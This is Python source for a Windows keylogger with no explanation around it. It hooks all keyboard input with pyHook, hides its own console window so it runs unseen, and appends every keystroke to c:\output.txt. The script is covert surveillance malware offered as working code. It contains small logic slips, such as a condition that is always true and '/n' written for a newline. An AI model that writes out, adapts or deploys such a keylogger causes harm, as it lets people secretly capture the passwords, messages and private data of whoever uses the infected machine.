# install pywin32, pyhook

import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def log_entries(event):
    if event.Ascii==5:
        exit(1)
    if event.Ascii !=0 or 8:
        f = open('c:\output.txt', 'r+')
        buffer = f.read()
        f.close()
        # open output.txt to write current + new keystrokes
        f = open('c:\output.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
            keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()


hm = pyHook.HookManager()
hm.KeyDown = log_entries
hm.HookKeyboard()
pythoncom.PumpMessages()